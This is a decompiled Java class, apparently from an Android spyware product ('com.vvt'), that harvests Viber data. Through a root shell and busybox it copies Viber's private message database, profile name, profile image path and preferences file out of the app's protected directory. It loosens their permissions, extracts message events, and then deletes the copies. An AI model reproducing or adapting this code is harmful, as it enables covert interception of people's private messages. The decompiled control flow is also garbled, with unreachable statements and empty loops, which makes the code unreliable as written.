package com.vvt.capture.viber.mode.a;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.viber.mode.full.c;
import com.vvt.capture.viber.mode.full.j;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final boolean c = com.vvt.ak.a.d;
  private String d;
  private boolean e;
  private com.vvt.base.b f;
  private com.vvt.h.d g;
  
  public d(String paramString, com.vvt.base.b paramb)
  {
    this.d = paramString;
    this.f = paramb;
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    Object localObject1 = null;
    int i = 2;
    int j = 1;
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data/com.viber.voip/files/preferences/";
    String str1 = "display_name";
    localObject2[j] = str1;
    String str2 = String.format("%s/%s", (Object[])localObject2);
    boolean bool1 = ShellUtil.b(str2);
    if (bool1) {}
    for (;;)
    {
      bool1 = com.vvt.ag.b.a(str2);
      if (!bool1)
      {
        localObject2 = p.a(paramString2, "display_name");
        str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        Object[] arrayOfObject = new Object[k];
        arrayOfObject[0] = paramString3;
        arrayOfObject[j] = str2;
        arrayOfObject[i] = localObject2;
        arrayOfObject[3] = localObject2;
        arrayOfObject[4] = paramString1;
        arrayOfObject[5] = paramString1;
        int m = 6;
        arrayOfObject[m] = localObject2;
        str2 = String.format(str1, arrayOfObject);
      }
      try
      {
        KMShell.a(str2);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k((String)localObject2);
        }
        localObject1 = localObject2;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          boolean bool2 = b;
          if (!bool2) {}
        }
      }
      return (String)localObject1;
      localObject2 = new Object[i];
      localObject2[0] = "/dbdata/data/com.viber.voip/files/preferences/";
      str1 = "display_name";
      localObject2[j] = str1;
      str2 = String.format("%s/%s", (Object[])localObject2);
      bool1 = ShellUtil.b(str2);
      if (!bool1)
      {
        bool2 = false;
        str2 = null;
      }
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = p.a(paramString1, "viber_messages");
    String str2 = p.a(paramString2, "viber_messages");
    String str3 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
    int i = 5;
    try
    {
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      arrayOfObject[0] = paramString2;
      j = 1;
      arrayOfObject[j] = paramString2;
      j = 2;
      arrayOfObject[j] = paramString4;
      j = 3;
      arrayOfObject[j] = paramString4;
      j = 4;
      arrayOfObject[j] = paramString2;
      str3 = String.format(str3, arrayOfObject);
      KMShell.a(str3);
      boolean bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(paramString2);
      }
      str3 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      i = 7;
      arrayOfObject = new Object[i];
      j = 0;
      arrayOfObject[0] = paramString3;
      j = 1;
      arrayOfObject[j] = str1;
      int k = 2;
      arrayOfObject[k] = str2;
      k = 3;
      arrayOfObject[k] = str2;
      k = 4;
      arrayOfObject[k] = paramString4;
      k = 5;
      arrayOfObject[k] = paramString4;
      k = 6;
      arrayOfObject[k] = str2;
      str1 = String.format(str3, arrayOfObject);
      KMShell.a(str1);
      bool2 = com.vvt.aa.a.c();
      if (bool2) {
        ShellUtil.k(str2);
      }
      bool2 = a;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return str2;
  }
  
  private String b()
  {
    return p.a(this.d, "busybox");
  }
  
  public static String b(String paramString1, String paramString2, String paramString3)
  {
    Object localObject1 = null;
    int i = 2;
    int j = 1;
    Object localObject2 = new Object[i];
    localObject2[0] = "/data/data/com.viber.voip/files/preferences/";
    String str1 = "image_uri";
    localObject2[j] = str1;
    String str2 = String.format("%s/%s", (Object[])localObject2);
    boolean bool1 = ShellUtil.b(str2);
    if (bool1) {}
    for (;;)
    {
      bool1 = com.vvt.ag.b.a(str2);
      if (!bool1)
      {
        localObject2 = p.a(paramString2, "image_uri");
        str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        Object[] arrayOfObject = new Object[k];
        arrayOfObject[0] = paramString3;
        arrayOfObject[j] = str2;
        arrayOfObject[i] = localObject2;
        arrayOfObject[3] = localObject2;
        arrayOfObject[4] = paramString1;
        arrayOfObject[5] = paramString1;
        int m = 6;
        arrayOfObject[m] = localObject2;
        str2 = String.format(str1, arrayOfObject);
      }
      try
      {
        KMShell.a(str2);
        bool2 = com.vvt.aa.a.c();
        if (bool2) {
          ShellUtil.k((String)localObject2);
        }
        localObject1 = localObject2;
      }
      catch (KMShell.ShellException localShellException)
      {
        for (;;)
        {
          boolean bool2 = b;
          if (!bool2) {}
        }
      }
      return (String)localObject1;
      localObject2 = new Object[i];
      localObject2[0] = "/dbdata/data/com.viber.voip/files/preferences/";
      str1 = "image_uri";
      localObject2[j] = str1;
      str2 = String.format("%s/%s", (Object[])localObject2);
      bool1 = ShellUtil.b(str2);
      if (!bool1)
      {
        bool2 = false;
        str2 = null;
      }
    }
  }
  
  private static String b(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject = new java/io/File;
        ((File)localObject).<init>(paramString2);
        bool = ((File)localObject).exists();
        if (!bool)
        {
          localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
          i = 5;
          arrayOfObject = new Object[i];
          j = 0;
          arrayOfObject[0] = paramString2;
          j = 1;
          arrayOfObject[j] = paramString2;
          j = 2;
          arrayOfObject[j] = paramString4;
          j = 3;
          arrayOfObject[j] = paramString4;
          j = 4;
          arrayOfObject[j] = paramString2;
          localObject = String.format((String)localObject, arrayOfObject);
          KMShell.a((String)localObject);
          bool = com.vvt.aa.a.c();
          if (bool) {
            ShellUtil.k(paramString2);
          }
        }
        localObject = new java/io/File;
        ((File)localObject).<init>(paramString1);
        localObject = ((File)localObject).getName();
        str = p.a(paramString2, (String)localObject);
        localObject = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int i = 7;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString3;
        j = 1;
        arrayOfObject[j] = paramString1;
        j = 2;
        arrayOfObject[j] = str;
        j = 3;
        arrayOfObject[j] = str;
        j = 4;
        arrayOfObject[j] = paramString4;
        j = 5;
        arrayOfObject[j] = paramString4;
        j = 6;
        arrayOfObject[j] = str;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str;
      bool = c;
      if (!bool) {}
    }
  }
  
  private String c()
  {
    return p.a(this.d, "viber");
  }
  
  public static String c(String paramString1, String paramString2, String paramString3)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = "/data/data/com.viber.voip/shared_prefs";
    arrayOfObject[1] = "com.viber.voip.ViberPrefs.xml";
    return b(String.format("%s/%s", arrayOfObject), paramString1, paramString2, paramString3);
  }
  
  private void d()
  {
    String str1 = c();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject1 = a.a();
      if (localObject1 != null)
      {
        String str1 = c();
        String str2 = b();
        Object localObject2 = this.f;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        localObject1 = a((String)localObject1, str1, str2, (String)localObject2);
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2) {
          l = c.a((String)localObject1);
        }
        d();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Long localLong;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    localObject1 = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject1).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject1).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        localObject1 = a.a();
        if (localObject1 != null)
        {
          int i = ((String)localObject1).length();
          if (i > 0)
          {
            String str1 = c();
            String str2 = b();
            localObject2 = this;
            Object localObject3 = this.f;
            localObject3 = ((com.vvt.base.b)localObject3).f();
            localObject1 = a((String)localObject1, str1, str2, (String)localObject3);
            boolean bool3 = a;
            if (bool3) {}
            bool3 = a;
            if (bool3) {}
            localObject2 = this;
            localObject3 = this.f;
            localObject3 = ((com.vvt.base.b)localObject3).f();
            str3 = a((String)localObject3, str1, str2);
            bool3 = a;
            if (bool3) {}
            localObject2 = this;
            localObject3 = this.f;
            localObject3 = ((com.vvt.base.b)localObject3).f();
            str4 = b((String)localObject3, str1, str2);
            bool3 = a;
            if (bool3) {}
            localObject2 = this;
            localObject3 = this.f;
            localObject3 = ((com.vvt.base.b)localObject3).f();
            str5 = c(str1, str2, (String)localObject3);
            boolean bool2 = a;
            if (bool2) {}
            bool2 = com.vvt.ag.b.a((String)localObject1);
            if (!bool2)
            {
              l1 = c.a((String)localObject1);
              long l2 = c.a((String)localObject1, paramInt);
              long l3 = 1L;
              long l4 = l2 - l3;
              localObject2 = this;
              bool2 = this.e;
              if (!bool2) {
                continue;
              }
              str1 = this.d;
              localObject4 = this.g;
              localObject5 = this.f;
              localObject1 = j.a((String)localObject1, str1, l4, l1, str3, str4, (com.vvt.h.d)localObject4, (com.vvt.base.b)localObject5);
              localObject2 = localArrayList;
              localArrayList.addAll((Collection)localObject1);
              bool1 = a;
              if (!bool1) {}
            }
            d();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject2;
        String str3;
        String str4;
        String str5;
        long l1;
        Object localObject4;
        Object localObject5;
        long l5;
        long l6;
        com.vvt.h.d locald;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject5 = this.d;
      l5 = 0L;
      l6 = paramInt;
      locald = this.g;
      localObject2 = this;
      localObject2 = this.f;
      localObject4 = localObject1;
      localObject1 = com.vvt.capture.viber.mode.full.b.a((String)localObject1, (String)localObject5, l5, l1, l6, str3, str4, str5, locald, (com.vvt.base.b)localObject2);
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = paramg1;
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      localObject1 = paramg2;
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    for (;;)
    {
      try
      {
        localObject2 = ((g)paramg1).getReference();
        localObject2 = (Long)localObject2;
        l1 = ((Long)localObject2).longValue();
        localObject2 = ((g)paramg2).getReference();
        localObject2 = (Long)localObject2;
        l2 = ((Long)localObject2).longValue();
        localObject2 = a.a();
        if (localObject2 != null)
        {
          int i = ((String)localObject2).length();
          if (i > 0)
          {
            String str1 = c();
            localObject3 = b();
            localObject1 = this;
            localObject4 = this.f;
            localObject4 = ((com.vvt.base.b)localObject4).f();
            localObject2 = a((String)localObject2, str1, (String)localObject3, (String)localObject4);
            boolean bool3 = a;
            if (bool3) {}
            bool3 = a;
            if (bool3) {}
            localObject1 = this;
            localObject4 = this.f;
            localObject4 = ((com.vvt.base.b)localObject4).f();
            localObject4 = a((String)localObject4, str1, (String)localObject3);
            boolean bool4 = a;
            if (bool4) {}
            localObject1 = this;
            localObject5 = this.f;
            localObject5 = ((com.vvt.base.b)localObject5).f();
            localObject5 = b((String)localObject5, str1, (String)localObject3);
            boolean bool5 = a;
            if (bool5) {}
            localObject1 = this;
            localObject6 = this.f;
            localObject6 = ((com.vvt.base.b)localObject6).f();
            str2 = c(str1, (String)localObject3, (String)localObject6);
            boolean bool2 = a;
            if (bool2) {}
            localObject1 = this;
            bool2 = this.e;
            if (!bool2) {
              continue;
            }
            str1 = this.d;
            localObject3 = this.g;
            localObject6 = this.f;
            localObject2 = j.a((String)localObject2, str1, l1, l2, (String)localObject4, (String)localObject5, (com.vvt.h.d)localObject3, (com.vvt.base.b)localObject6);
            localObject1 = localArrayList;
            localArrayList.addAll((Collection)localObject2);
            bool1 = a;
            if (bool1) {}
            d();
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        long l1;
        long l2;
        Object localObject3;
        Object localObject4;
        Object localObject5;
        Object localObject6;
        String str2;
        long l3;
        com.vvt.h.d locald;
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject6 = this.d;
      l3 = 2147483647L;
      locald = this.g;
      localObject1 = this;
      localObject1 = this.f;
      localObject3 = localObject2;
      localObject2 = com.vvt.capture.viber.mode.full.b.a((String)localObject2, (String)localObject6, l1, l2, l3, (String)localObject4, (String)localObject5, str2, locald, (com.vvt.base.b)localObject1);
    }
  }
  
  public void a(com.vvt.h.d paramd)
  {
    this.g = paramd;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/mode/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */